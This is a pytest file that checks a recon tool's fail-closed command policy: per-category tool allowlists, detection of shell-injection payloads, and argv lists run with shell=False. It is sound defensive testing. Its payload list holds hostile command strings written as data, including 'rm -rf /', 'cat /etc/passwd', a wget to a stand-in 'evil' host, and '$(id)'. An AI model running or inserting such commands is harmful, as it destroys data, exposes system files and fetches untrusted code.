"""Fail-closed execution guarantees — allowlist + ``shell=False`` (SEC-009).

These tests assert the *inverse* of the malicious "unrestricted / shell=True"
posture: the deterministic policy layer rejects shell-injection payloads and
allowlist-bypass attempts, and the executor materialises every command as an
argv **list** run with ``shell=False`` — so metacharacters supplied by an LLM,
a target response, or tool output stay inert data and are never interpreted by
a shell.

Two layers are covered:

* policy — :func:`evaluate_kal_mcp_policy` / :func:`kal_argv_has_injection_risk`
  (the fail-closed allowlist that gates LLM-proposed argv);
* executor — :func:`execute_command` (second allowlist gate) and
  :func:`run_argv_simple_sync` / :func:`build_sandbox_exec_argv` (the only
  subprocess path), which must never build or run a shell string.
"""

from __future__ import annotations

from types import SimpleNamespace
from typing import Any

import pytest

from src.recon import sandbox_tool_runner
from src.recon.mcp.policy import (
    evaluate_kal_mcp_policy,
    kal_argv_has_injection_risk,
)
from src.recon.sandbox_tool_runner import build_sandbox_exec_argv, run_argv_simple_sync
from src.tools import executor as executor_mod

# Shell metacharacters that MUST be rejected by the argv injection guard.
_INJECTION_PAYLOADS = [
    "1.2.3.4; rm -rf /",
    "$(id)",
    "`id`",
    "a | cat /etc/passwd",
    "a && wget http://evil/x",
    "a\nrm -rf /",
    "a\rreboot",
    "<(bash)",
    ">(bash)",
    "${IFS}cat",
]


# ---------------------------------------------------------------------------
# Policy layer — fail-closed allowlist
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
def test_injection_payload_flagged(payload: str) -> None:
    """Every shell-metacharacter payload is detected as an injection risk."""
    assert kal_argv_has_injection_risk(["nmap", payload]) is True


@pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
def test_policy_rejects_injection_payload(payload: str) -> None:
    """A category on the allowlist still denies argv carrying shell metacharacters."""
    decision = evaluate_kal_mcp_policy(
        category="network_scanning",
        argv=["nmap", payload],
        password_audit_opt_in=False,
        server_password_audit_enabled=False,
    )
    assert decision.allowed is False
    assert decision.reason == "argv_injection_pattern"


@pytest.mark.parametrize(
    "argv0",
    ["/usr/bin/nmap", "./nmap", "../nmap", "bin/nmap", "C:\\evil\\nmap"],
)
def test_policy_rejects_argv0_with_path(argv0: str) -> None:
    """A pathful argv[0] cannot masquerade as an allowlisted bare binary."""
    decision = evaluate_kal_mcp_policy(
        category="network_scanning",
        argv=[argv0, "1.2.3.4"],
        password_audit_opt_in=False,
        server_password_audit_enabled=False,
    )
    assert decision.allowed is False
    assert decision.reason == "binary_path_not_allowed"


@pytest.mark.parametrize(
    ("category", "argv"),
    [
        ("network_scanning", ["sqlmap", "-u", "http://x"]),  # real tool, wrong category
        ("network_scanning", ["evilbin", "1.2.3.4"]),  # not on any allowlist
        ("web_fingerprinting", ["nmap", "1.2.3.4"]),  # allowlisted tool, wrong category
    ],
)
def test_policy_rejects_tool_not_in_category(category: str, argv: list[str]) -> None:
    decision = evaluate_kal_mcp_policy(
        category=category,
        argv=argv,
        password_audit_opt_in=False,
        server_password_audit_enabled=False,
    )
    assert decision.allowed is False
    assert decision.reason == "tool_not_allowed_for_category"


def test_policy_rejects_empty_argv() -> None:
    decision = evaluate_kal_mcp_policy(
        category="network_scanning",
        argv=[],
        password_audit_opt_in=False,
        server_password_audit_enabled=False,
    )
    assert decision.allowed is False
    assert decision.reason == "empty_argv"


# ---------------------------------------------------------------------------
# Executor layer — allowlist gate + shell=False argv path
# ---------------------------------------------------------------------------


def test_execute_command_rejects_non_allowlisted_tool_without_subprocess(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A tool outside ``ALLOWED_TOOLS`` is denied before any subprocess spawns."""
    ran: list[Any] = []

    monkeypatch.setattr(
        executor_mod,
        "run_argv_simple_sync",
        lambda *a, **k: ran.append((a, k)),
    )
    monkeypatch.setattr(
        executor_mod,
        "check_tool_available",
        lambda *a, **k: ran.append(("check", a, k)) or True,
    )

    result = executor_mod.execute_command("evilbin --pwn", use_cache=False)

    assert result["success"] is False
    assert "Tool not allowed" in result["stderr"]
    assert ran == [], "no subprocess/availability call may happen for a denied tool"


def test_run_argv_simple_sync_uses_shell_false_and_list(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The only subprocess path runs a list with ``shell=False`` — metachars stay inert."""
    captured: dict[str, Any] = {}

    def _fake_run(args: Any, **kwargs: Any) -> SimpleNamespace:
        captured["args"] = args
        captured["kwargs"] = kwargs
        return SimpleNamespace(returncode=0, stdout="ok", stderr="")

    monkeypatch.setattr(sandbox_tool_runner.subprocess, "run", _fake_run)

    argv = ["nmap", "-sV", "1.2.3.4; rm -rf /"]
    out = run_argv_simple_sync(argv, timeout_sec=1.0)

    assert out["success"] is True
    assert isinstance(captured["args"], list)
    assert captured["kwargs"]["shell"] is False
    # The metacharacter payload survives as a single, inert argv element.
    assert captured["args"] == argv
    assert captured["args"][-1] == "1.2.3.4; rm -rf /"


def test_build_sandbox_exec_argv_never_builds_shell_string(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """docker-exec wrapping keeps argv as a list; metacharacters are not concatenated."""
    argv = ["nmap", "1.2.3.4; rm -rf /"]

    # Local (no sandbox): argv is returned as-is, still a list.
    local = build_sandbox_exec_argv(argv, use_sandbox=False)
    assert local == argv
    assert isinstance(local, list)

    monkeypatch.setattr(sandbox_tool_runner.settings, "sandbox_enabled", True)
    monkeypatch.setattr(sandbox_tool_runner.settings, "sandbox_container_name", "argus-sandbox")

    wrapped = build_sandbox_exec_argv(argv, use_sandbox=True)
    assert wrapped == ["docker", "exec", "argus-sandbox", "nmap", "1.2.3.4; rm -rf /"]
    assert isinstance(wrapped, list)
    # The payload remains one element — never split, never shell-joined.
    assert wrapped[-1] == "1.2.3.4; rm -rf /"
